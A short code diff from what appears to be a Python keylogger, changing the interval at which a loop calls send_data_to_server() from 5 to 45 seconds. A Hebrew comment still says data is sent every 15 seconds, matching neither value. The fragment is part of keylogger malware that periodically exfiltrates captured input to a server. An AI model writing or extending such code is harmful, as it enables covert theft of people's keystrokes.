@@ -34,7 +34,7 @@ class KeyloggerManeger:
     def f(self):
         try:
             while True:
-                time.sleep(5)  # כל 15 שניות שולח נתונים
+                time.sleep(45)  # כל 15 שניות שולח נתונים
                 self.send_data_to_server()
         except KeyboardInterrupt:
             print("Keylogger stopped.")
